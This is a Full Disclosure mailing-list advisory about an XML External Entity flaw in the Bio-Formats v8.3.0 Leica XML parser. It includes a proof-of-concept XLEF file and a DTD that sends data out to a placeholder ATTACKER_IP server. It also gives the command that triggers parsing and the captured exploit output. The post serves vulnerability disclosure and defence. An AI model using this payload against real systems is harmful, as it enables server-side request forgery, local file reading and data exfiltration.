---
title: Bioformats v8.3.0 Improper Restriction of XML External Entity Reference in Bio-Formats Leica Microsystems XML Parser
url: https://seclists.org/fulldisclosure/2026/Jan/6
source: Full Disclosure
date: 2026-01-06
fetch_date: 2026-01-07T03:30:41.460046
---

# Bioformats v8.3.0 Improper Restriction of XML External Entity Reference in Bio-Formats Leica Microsystems XML Parser

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

![](/shared/images/nst-icons.svg#search)

# Bioformats v8.3.0 Improper Restriction of XML External Entity Reference in Bio-Formats Leica Microsystems XML Parser

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Mon, 29 Dec 2025 22:56:29 -0500

---

```
Bio-Formats contains an XML External Entity (XXE) vulnerability in the
Leica Microsystems metadata parsing component. The vulnerability is caused
by the use of an insecurely configured DocumentBuilderFactory when
processing Leica XML-based metadata files (e.g., XLEF). When a crafted XML
file is supplied, the parser allows external entity resolution and external
DTD loading, enabling attackers to trigger arbitrary outbound network
requests, access local system resources, or cause a denial-of-service
condition during XML parsing.

*Impact:*
An attacker who can supply a crafted Leica XML metadata file may:
* Trigger XML External Entity (XXE) injection
* Perform server-side request forgery (SSRF) via outbound HTTP requests
* Access local files where XML-safe content exists
* Cause denial of service through entity expansion or parser instability
* Exfiltrate data through blind out-of-band channels
Exploitation occurs during XML parsing and does not require authentication.

*Proof of Concept:*
Malicious XLEF File
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY % ext SYSTEM "http://ATTACKER_IP:8000/evil.dtd";>
  %ext;
]>
<xlef>
  <Image>&exfil;</Image>
</xlef>
Attacker-Controlled External DTD (evil.dtd)
<!ENTITY exfil SYSTEM "http://ATTACKER_IP:8000/exfil?data=ubuntu";>

*Exploit Execution:*
java -cp bioformats_package.jar \
     loci.formats.tools.ImageInfo xxe_blind.xlef

*Observed Exploit Output:*
Victim Application Output
Initializing reader
XLEFReader initializing xxe_blind.xlef
http://ATTACKER_IP:8000/exfil?data=ubuntu
java.io.FileNotFoundException: http://ATTACKER_IP:8000/exfil?data=ubuntu
    at org.apache.xerces.impl.XMLEntityManager.setupCurrentEntity
    at org.apache.xerces.impl.XMLEntityManager.startEntity
    at org.apache.xerces.impl.XMLDTDScannerImpl.scanDTDInternalSubset
    at javax.xml.parsers.DocumentBuilder.parse
    at LMSXmlDocument.initFromFilepath(LMSXmlDocument.java:125)
Attacker HTTP Server Log
192.x.x.x - - [23/Dec/2025 23:28:19]
"GET /exfil?data=ubuntu HTTP/1.1" 404 -
The outbound HTTP request confirms that the XML parser resolved
attacker-controlled external entities during file parsing.
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](5)
[By Date](date.html#6)
[![Next](/images/right-icon-16x16.png)](7)

[![Previous](/images/left-icon-16x16.png)](5)
[By Thread](index.html#6)
[![Next](/images/right-icon-16x16.png)](7)

### Current thread:

* **Bioformats v8.3.0 Improper Restriction of XML External Entity Reference in Bio-Formats Leica Microsystems XML Parser** *Ron E (Jan 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")